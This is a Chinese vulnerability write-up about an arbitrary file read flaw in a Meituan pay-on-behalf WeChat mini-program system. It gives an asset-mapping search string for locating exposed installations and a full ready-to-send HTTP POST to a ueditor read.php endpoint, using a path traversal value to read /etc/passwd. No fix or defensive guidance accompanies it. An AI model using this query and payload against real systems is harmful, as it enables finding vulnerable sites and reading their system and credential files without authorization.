# 美团代付微信小程序系统read存在任意文件读取漏洞

# 一、漏洞简介
<font style="color:rgba(0, 0, 0, 0.84);">美团代付微信小程序系统是美团点评旗下的一款基于微信小程序技术开发的应用程序功能之一，它允许用户方便快捷地请求他人为自己支付订单费用。随着移动支付的普及和微信小程序的广泛应用，美团作为中国领先的本地生活服务平台，推出了代付功能，以满足用户多样化的支付重求。通过微信小程序，用户可以轻松实现代付操作，无需跳转到其他应用或网页，提高了支付的便捷性和效率。前台支持购物车，个人中心，多选项等功能 ，后台支持推广，代理管理，菜品管理，积分明细，订单管理，模板，支付通道管理等功能。美团代付微信小程序系统read存在任意文件读取漏洞</font>

# <font style="color:rgba(0, 0, 0, 0.84);">二、影响版本</font>
+ 美团代付微信小程序系统 

# 三、资产测绘
```plain
body="/h5/static/js/chunk-vendors.js"
```

![1731078960863-27f91f64-e014-42be-b150-31c628bcc3fc.png](./img/cXUMgsA9n5GhpcIa/1731078960863-27f91f64-e014-42be-b150-31c628bcc3fc-651366.png)

# 四、漏洞复现
```plain
POST /static/ueditor22/_test/tools/br/read.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
 
name=../../../../../../../../../etc/passwd
```

![1731078883672-59e6b35a-2fe2-4f03-a02e-7dd31ca97c13.png](./img/cXUMgsA9n5GhpcIa/1731078883672-59e6b35a-2fe2-4f03-a02e-7dd31ca97c13-666911.png)



> 更新: 2024-11-27 10:00:37  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ymuepw56n41ianbg>